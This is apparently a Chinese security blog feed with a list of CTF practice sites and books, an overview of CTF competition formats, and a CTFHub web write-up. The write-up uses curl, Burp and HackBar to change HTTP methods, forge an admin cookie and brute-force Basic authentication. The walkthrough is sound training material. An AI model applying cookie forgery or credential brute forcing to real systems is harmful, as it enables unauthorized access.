href="https://link.zhihu.com/?target=http%3A//pwnable.kr/">http://pwnable.kr/</a></p><p>pwnable(TAIWAN)</p><p><a href="https://link.zhihu.com/?target=http%3A//pwnable.tw/">http://pwnable.tw/</a></p><p>exploit-exercises</p><p><a href="https://link.zhihu.com/?target=https%3A//exploit-exercises.com/">https://exploit-exercises.com/</a></p><p>overthewire</p><p><a href="https://link.zhihu.com/?target=http%3A//overthewire.org/wargames/">http://overthewire.org/wargames/</a></p><p>netgarage</p><p><a href="https://link.zhihu.com/?target=https%3A//io.netgarage.org/">https://io.netgarage.org/</a></p><p>bin干货</p><p><a href="https://link.zhihu.com/?target=http%3A//security.cs.rpi.edu/courses/binexp-spring2015/">http://security.cs.rpi.edu/courses/binexp-spring2015/</a></p><h3 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h3><p>sqli-labs</p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>RedTigers Hackit</p><p><a href="https://link.zhihu.com/?target=http%3A//redtiger.labs.overthewire.org/">http://redtiger.labs.overthewire.org/</a></p><h3 id="XSS："><a href="#XSS：" class="headerlink" title="XSS："></a>XSS：</h3><p>prompt</p><p><a href="https://link.zhihu.com/?target=http%3A//prompt.ml/0">http://prompt.ml/0</a></p><p>XSS Challenges</p><p><a href="https://link.zhihu.com/?target=http%3A//xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p><p>escape</p><p><a href="https://link.zhihu.com/?target=https%3A//alf.nu/alert1">https://alf.nu/alert1</a></p><p>xss-game</p><p><a href="https://link.zhihu.com/?target=https%3A//xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h3 id="OJ平台以及CTF赛事复盘："><a href="#OJ平台以及CTF赛事复盘：" class="headerlink" title="OJ平台以及CTF赛事复盘："></a>OJ平台以及CTF赛事复盘：</h3><p>XCTF-OJ</p><p><a href="https://link.zhihu.com/?target=http%3A//oj.xctf.org.cn/">http://oj.xctf.org.cn/</a></p><p>Pwnhub</p><p><a href="https://link.zhihu.com/?target=http%3A//pwnhub.cn/">http://pwnhub.cn/</a></p><p>Jarvisoj</p><p><a href="https://link.zhihu.com/?target=https%3A//www.jarvisoj.com/">https://www.jarvisoj.com/</a></p><h3 id="国内综合练习-国产的-："><a href="#国内综合练习-国产的-：" class="headerlink" title="国内综合练习(国产的)："></a>国内综合练习(国产的)：</h3><p>网络信息攻防学习平台</p><p><a href="https://link.zhihu.com/?target=http%3A//hackinglab.cn/">http://hackinglab.cn/</a></p><p>西普实验吧</p><p><a href="https://link.zhihu.com/?target=http%3A//www.shiyanbar.com/ctf/practice">http://www.shiyanbar.com/ctf/practice</a></p><p>I春秋CTF挑战</p><p><a href="https://link.zhihu.com/?target=http%3A//www.ichunqiu.com/racing">http://www.ichunqiu.com/racing</a></p><p>合天CTF</p><p><a href="https://link.zhihu.com/?target=http%3A//www.hetianlab.com/CTFrace.html">http://www.hetianlab.com/CTFrace.html</a></p><p>南京邮电大学</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.nuptsast.com/">http://ctf.nuptsast.com/</a></p><p>SniperOJ</p><p><a href="https://link.zhihu.com/?target=http%3A//www.sniperoj.cn/">http://www.sniperoj.cn/</a></p><p>bugku</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.bugku.com/">http://ctf.bugku.com/</a></p><p>CTF题目</p><p><a href="https://link.zhihu.com/?target=http%3A//captf.com/">http://captf.com/</a></p><p>光棍节程序员闯关秀</p><p><a href="https://link.zhihu.com/?target=https%3A//1111.segmentfault.com/">https://1111.segmentfault.com/</a></p><p>ISA Test</p><p><a href="https://link.zhihu.com/?target=https%3A//www.helloisa.com/test/">https://www.helloisa.com/test/</a></p><p>黑客丛林之旅</p><p><a href="https://link.zhihu.com/?target=http%3A//www.fj543.com/hack/">http://www.fj543.com/hack/</a></p><p>Jlu.CTF</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.spirit.org.cn/">http://ctf.spirit.org.cn/</a></p><p>红客闯关游戏</p><p><a href="https://link.zhihu.com/?target=http%3A//hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></p><h3 id="国外综合练习-进口的-："><a href="#国外综合练习-进口的-：" class="headerlink" title="国外综合练习(进口的)："></a>国外综合练习(进口的)：</h3><p>wechall</p><p><a href="https://link.zhihu.com/?target=http%3A//www.wechall.net/">http://www.wechall.net/</a></p><p>webhacking</p><p><a href="https://link.zhihu.com/?target=http%3A//webhacking.kr/">http://webhacking.kr/</a></p><p>canyouhack</p><p><a href="https://link.zhihu.com/?target=http%3A//canyouhack.it/">http://canyouhack.it/</a></p><p>coolshell</p><p><a href="https://link.zhihu.com/?target=http%3A//fun.coolshell.cn/">http://fun.coolshell.cn/</a></p><p>ringzer0team</p><p><a href="https://link.zhihu.com/?target=https%3A//ringzer0team.com/challenge">https://ringzer0team.com/challenge</a></p><p>backdoor</p><p><a href="https://link.zhihu.com/?target=https%3A//backdoor.sdslabs.co/">https://backdoor.sdslabs.co/</a></p><p>smashthestack</p><p><a href="https://link.zhihu.com/?target=http%3A//smashthestack.org/">http://smashthestack.org/</a></p><p>overthewire</p><p><a href="https://link.zhihu.com/?target=http%3A//overthewire.org/wargames/">http://overthewire.org/wargames/</a></p><p>w3challs</p><p><a href="https://link.zhihu.com/?target=https%3A//w3challs.com/">https://w3challs.com/</a></p><p>chall.stypr</p><p><a href="https://link.zhihu.com/?target=https%3A//chall.stypr.com/home">https://chall.stypr.com/home</a></p><p>pentesterlab</p><p><a href="https://link.zhihu.com/?target=https%3A//pentesterlab.com/">https://pentesterlab.com/</a></p><p>id0-rsa</p><p><a href="https://link.zhihu.com/?target=https%3A//id0-rsa.pub/">https://id0-rsa.pub/</a></p><h2 id="0x03-各种姿势的学习平台"><a href="#0x03-各种姿势的学习平台" class="headerlink" title="0x03 各种姿势的学习平台"></a>0x03 各种姿势的学习平台</h2><p>ChaMd5的wooyun镜像站</p><p><a href="https://link.zhihu.com/?target=http%3A//wooyun.chamd5.org/">http://wooyun.chamd5.org/</a></p><p>吾爱破解</p><p><a href="https://link.zhihu.com/?target=http%3A//www.52pojie.cn/">http://www.52pojie.cn/</a></p><p>看雪论坛</p><p><a href="https://link.zhihu.com/?target=http%3A//bbs.pediy.com/">http://bbs.pediy.com/</a></p><p>T00ls</p><p><a href="https://link.zhihu.com/?target=https%3A//www.t00ls.net/">https://www.t00ls.net/</a></p><h2 id="0x04-CTF-writeup-WP"><a href="#0x04-CTF-writeup-WP" class="headerlink" title="0x04 CTF-writeup(WP)"></a>0x04 CTF-writeup(WP)</h2><p>CTF Writeup Summary</p><p><a href="http://sec.yka.me/">http://sec.yka.me/</a></p><p>360安全客</p><p><a href="http://bobao.360.cn/ctf/">http://bobao.360.cn/ctf/</a></p><p>CTF Writeup github</p><p><a href="https://github.com/ctfs/">https://github.com/ctfs/</a></p><p>Writeups：<a href="https://github.com/VulnHub/ctf-">https://github.com/VulnHub/ctf-</a></p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>CTF比赛国内主要分五类，Web渗透、密码学、逆向工程、漏洞利用、杂项。</p><p>CTF 是无法通过一本书来完整概括的，因此初学者应该了解基础原理之下多加练习。</p><p>1、从 0 到 1 ：CTFer 成长之路</p><p>2、CTF 特训营：技术详解、解题方法与竞赛技巧</p><h2 id="CTF-Web"><a href="#CTF-Web" class="headerlink" title="CTF-Web"></a>CTF-Web</h2><p>1、Web安全防护指南：基础篇</p><p>2、代码审计</p><h2 id="Web-安全"><a href="#Web-安全" class="headerlink" title="Web 安全"></a>Web 安全</h2><p>1、黑客攻防技术宝典-系统实战篇</p><p>2、Web 之困-现代 Web 应用安全指南</p><p>3、黑客攻防技术宝典- Web 实战篇</p><p>4、SQL 注入攻击与防御</p><p>5、Web 渗透技术及实战案例解析</p><p>6、Web 应用安全权威指南</p><p>7、白帽子讲 Web 安全</p><p>8、黑客大曝光-网络安全机密与解决方案</p><p>9、Wireshark 数据包分析实战</p><p>10、Web 应用安全威胁与防治-基于 OWASP Top 10 与 ESAPI</p><p>11、Web 安全深度剖析</p><p>12、Ajax 安全技术</p><p>13、Web 前端黑客技术揭秘</p><p>14、XSS 跨站脚本攻击剖析与防御</p><p>15、代码审计-企业级 Web 代码安全架构</p><p>16、Web 安全测试</p><p>17、白帽子讲浏览器安全</p><p>18、Web 入侵安全测试与对策</p><h2 id="CTF-Crypto"><a href="#CTF-Crypto" class="headerlink" title="CTF-Crypto"></a>CTF-Crypto</h2><h2 id="CTF-Pwn"><a href="#CTF-Pwn" class="headerlink" title="CTF-Pwn"></a>CTF-Pwn</h2><h2 id="CTF-Reverse"><a href="#CTF-Reverse" class="headerlink" title="CTF-Reverse"></a>CTF-Reverse</h2><p>1、逆向工程权威指南</p><h2 id="CTF-Misc"><a href="#CTF-Misc" class="headerlink" title="CTF-Misc"></a>CTF-Misc</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于CTF</title>
    <link href="/2021/07/30/CTF/%E5%85%B3%E4%BA%8ECTF/"/>
    <url>/2021/07/30/CTF/%E5%85%B3%E4%BA%8ECTF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-CTF简介"><a href="#0x01-CTF简介" class="headerlink" title="0x01 CTF简介"></a>0x01 CTF简介</h1><p>CTF（<strong>C</strong>apture <strong>T</strong>he <strong>F</strong>lag，夺旗赛）CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有<code>一定格式的字符串</code>或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。 flag所表示的为目标服务器上存储的一些<code>敏感机密</code>的信息, 这些信息正常情况下是不能对外暴露的。选手利用目标的一些漏洞，获取到flag，其表示的即为在真实的黑客攻击中窃取到的机密信息。 一般情况下flag拥有固定格式为<code>flag&#123;xxxxx&#125;</code>，有些比赛会把flag关键词替换，例如CTFHub平台的flag为<code>ctfhub&#123;xxxxx&#125;</code>，利用固定格式来反推flag也是一种常见的解题思路 通常来说CTF是以团队为单位进行参赛。每个团队3-5人(具体根据主办方要求决定)，在整个比赛过程中既要每个选手拥有某个方向的漏洞挖掘能力，也要同队选手之间的相互配合。</p><h1 id="0x02-题目类型"><a href="#0x02-题目类型" class="headerlink" title="0x02 题目类型"></a>0x02 题目类型</h1><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag<br> 常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT 相关等等。五花八门，种类繁多。</p><h1 id="0x03-竞赛模式"><a href="#0x03-竞赛模式" class="headerlink" title="0x03 竞赛模式"></a>0x03 竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h2><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[ AI自动化]"></a>RHG-自动化[ AI自动化]</h2><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h2><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h1 id="0x04-比赛形式"><a href="#0x04-比赛形式" class="headerlink" title="0x04 比赛形式"></a>0x04 比赛形式</h1><p>CTF比赛一般分为线上赛和线下赛。通常来说，线上赛多为<code>初赛</code>, 线下赛多为<code>决赛</code>, 但是也不排除直接进行</p><h2 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h2><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>)来帮助选手做题。</p><h2 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h2><p>选手前往比赛所在地，现场接入比赛网络进行比赛，线下多为AWD模式，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong>，<strong>解题+RW</strong> 等等</p><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.ctfhub.com/">CTFHub</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-Web前置技能-HTTP协议</title>
    <link href="/2021/07/30/CTF/Web/Write-up/CTFHub-Web-Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/07/30/CTF/Web/Write-up/CTFHub-Web-Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="1、请求方式"><a href="#1、请求方式" class="headerlink" title="1、请求方式"></a>1、请求方式</h2><p>可以看到，它告诉我们 HTTP Method是 GET，使用 CTF**B Method，它就会给我们 flag，这里没有直接给出 Method ，但可以猜测大概率会是 CTFHUB ，我们将 Method 进行修改，看能否得到 flag。</p><p>注意，它给了我们一个 Hint（提示）：如果得到 <strong>HTTP Method Not Allowed</strong> 错误，我们需要请求 <strong>index.php</strong>。所以，我们可以直接请求 <strong>index.php</strong> 来避免出现错误。</p><h3 id="1）Curl"><a href="#1）Curl" class="headerlink" title="1）Curl"></a>1）Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -v -X CTFHUB http://challenge-05d6fc1837d37b70.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p>得到 flag：<code>ctfhub&#123;8edef26a2f40c879b279f243&#125;</code> 。</p><h3 id="2）Burp"><a href="#2）Burp" class="headerlink" title="2）Burp"></a>2）Burp</h3><p>抓包</p><blockquote><p>将这个包发到重放模块（Repeater）：修改 Method<br>发送后就可以得到flag</p></blockquote><p>或</p><blockquote><p>更改请求方式，更改完成后点击 Forward，放包<br>查看网页返回情况，成功拿到 flag</p></blockquote><h2 id="2、302-跳转"><a href="#2、302-跳转" class="headerlink" title="2、302 跳转"></a>2、302 跳转</h2><p>点击 <code>give me flag</code> 发现又回到了这个页面。</p><p>查看网页源码可知，点击 <code>give me flag</code> 应该跳转到 <code>index.php</code> ，实际上却跳转到了 <code>index.html</code> ，看来是被重定向了。</p><p>所以，我们可以使用 <code>curl</code> 命令行来查看响应，也可以使用 <code>burp</code> 抓包来改成 <code>index.php</code> 。</p><h3 id="1）Curl-1"><a href="#1）Curl-1" class="headerlink" title="1）Curl"></a>1）Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -v -X GET http://challenge-21ef394af4eb1915.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><p>得到 flag：<code>ctfhub&#123;bca0c758b9ce7a4db57631d6&#125;</code>。</p><h3 id="2）Burp-1"><a href="#2）Burp-1" class="headerlink" title="2）Burp"></a>2）Burp</h3><p>使用 <code>burp</code> 抓包，将这个包发到重放模块；</p><p>将 <code>index.html</code> 修改为 <code>index.php</code> ;</p><p>发送，即可得到 <code>flag</code> 。</p><h2 id="3、Cookie"><a href="#3、Cookie" class="headerlink" title="3、Cookie"></a>3、Cookie</h2><p>根据题目，我们必须要伪造成管理员才能得到 <code>flag</code>，可以通过改 <code>cookie</code> 来伪造成管理员。</p><h3 id="1）Burp"><a href="#1）Burp" class="headerlink" title="1）Burp"></a>1）Burp</h3><p>使用 <code>burp</code> 抓包，可以看到 <code>cookie: admin = 0</code></p><p>将这个包发到重放模块，将其修改为 <code>cookie: admin = 1</code> 。</p><p>发送，得到 flag 。</p><h3 id="2）HackBar"><a href="#2）HackBar" class="headerlink" title="2）HackBar"></a>2）HackBar</h3><p>查看得知 <code>Cookie：admin = 0</code></p><p>点击 <code>Load URL</code> ，载入 <code>URL</code></p><p>勾选 <code>Cookies</code> ，输入 <code>admin = 1</code></p><p>点击 <code>Execute</code> ，运行，得到 flag：<code>ctfhub&#123;3dd0714df3ce639635c048d7&#125;</code> 。</p><h2 id="4、基础认证"><a href="#4、基础认证" class="headerlink" title="4、基础认证"></a>4、基础认证</h2><p>进入题目页面，发现点击 <code>click</code> 会出现认证登录页面，先任意输入 <code>admin/admin</code> 进行登录尝试，发现不对。抓包看数据，可以看见一条特殊字符串 <code>WWW-Authenticate：Basic realm = &quot;Do u know admin ?&quot;</code> ，暂时没有其他线索，假设用户名就是 <code>admin</code>，然后进行暴力破解。</p><blockquote><p>Basic 为验证的模式，表示基础认证，realm = “Do u know admin ?” 为保护域</p></blockquote><p>再次输入 <code>admin/admin</code> 进行登录尝试，对认证请求进行抓取，得到认证消息 <code>Authorization：Basic YWRtaW46YWRtaW4=</code> ， <code>YWRtaW46YWRtaW4=</code> 大概率为 <code>Base64 编码</code> 。将 <code>YWRtaW46YWRtaW4=</code> 发到 <code>Decoder</code> ，对其进行 <code>Base64 解码</code>，得到开始尝试输入的账号和密码 <code>admin:admin</code> 。</p><p>接下来，对其进行暴力破解：</p><p>1）将报文发送到 <code>Intruder</code>，点击 <code>Positions</code>，将<code>YWRtaW46YWRtaW4=</code> 添加为 <code>Payload Positions</code> 。</p><p>2）在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>Simple List</code>，然后在 <code>Payload Options</code> 中点击 <code>Load</code> 加载密码字典。</p><p>3）在 <code>Payload Options</code> 中，点击 <code>Add</code> ，选择 <code>Add Prefix（添加前缀）</code> ，输入 <code>admin:</code> 。</p><p>​      在 <code>Payload Options</code> 中，点击 <code>Add</code> ，选择 <code>Encode（添加一个编码方式）</code> ，选择 <code>Base64 Encode</code> 。</p><blockquote><p>注意：一定要先加前缀 <code>admin:</code> 然后再进行编码，因为服务端判断的是合并后的 base64 编码。</p></blockquote><p>4）在 <code>Payload Encode</code> 中，取消勾选的 <code>URL-encode</code> ，不然你会看到 <code>base64</code> 之后的 <code>=</code> 会被转换成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来 。</p><p>5）点击 <code>Start Attack</code> ，开始爆破，完成后按 <strong>Length</strong> 排序，发现一个长度不一样的，并看到状态码为 <strong>200</strong> ，说明爆破成功 。</p><p>6）点击查看，点击 <code>Response</code>，得到 <code>flag：ctfhub&#123;a6bb3b3c9d6d4eeab2dae1f3&#125;</code></p><h2 id="5、响应包源代码"><a href="#5、响应包源代码" class="headerlink" title="5、响应包源代码"></a>5、响应包源代码</h2><p>根据题目，<code>F12</code> 查看源代码，得到 <code>flag：ctfhub&#123;15bf236024e2d2979ade7339&#125;</code> </p><p>当然也可以用 <code>curl</code> 和 <code>burp</code> 得到 <code>flag</code> 。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>HTTP</tag>
      
      <tag>Wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP协议</title>
    <link href="/2021/07/30/CTF/Web/Notes/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/07/30/CTF/Web/Notes/HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-HTTP-简介"><a href="#0x01-HTTP-简介" class="headerlink" title="0x01 HTTP 简介"></a>0x01 HTTP 简介</h1><p>HTTP 协议（Hyper Text Transfer Protocol，超文本传输协议）是用于从万维网（WWW ：World Wide Web ）服务器传输超文本到本地浏览器的传送协议，是因特网上应用最为广泛的一种网络传输协议，所有的 WWW 文件都必须遵守这个标准。</p><p>HTTP 是一个基于 TCP/IP 通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p><h2 id="1、HTTP-工作原理"><a href="#1、HTTP-工作原理" class="headerlink" title="1、HTTP 工作原理"></a>1、HTTP 工作原理</h2><p>HTTP 协议工作于客户端-服务端架构上。浏览器作为 HTTP 客户端通过 URL 向 HTTP 服务端即 WEB 服务器发送所有请求。</p><p>Web 服务器有：Apache 服务器，IIS 服务器（Internet Information Services）等。</p><p>Web 服务器根据接收到的请求后，向客户端发送响应信息。</p><p>HTTP 默认端口号为 80，但是你也可以改为 8080 或者其他端口。</p><p><strong>HTTP三点注意事项：</strong></p><ul><li>HTTP 是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li><li>HTTP 是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过 HTTP 发送。客户端以及服务器指定使用适合的 MIME-type 内容类型。</li><li>HTTP 是无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="2、HTTP-消息结构"><a href="#2、HTTP-消息结构" class="headerlink" title="2、HTTP 消息结构"></a>2、HTTP 消息结构</h2><p>HTTP 是基于客户端/服务端（C/S）的架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。</p><p>一个 HTTP “客户端”是一个应用程序（Web 浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个 HTTP 的请求的目的。</p><p>一个 HTTP “服务器”同样也是一个应用程序（通常是一个Web 服务，如 Apache Web 服务器或 IIS 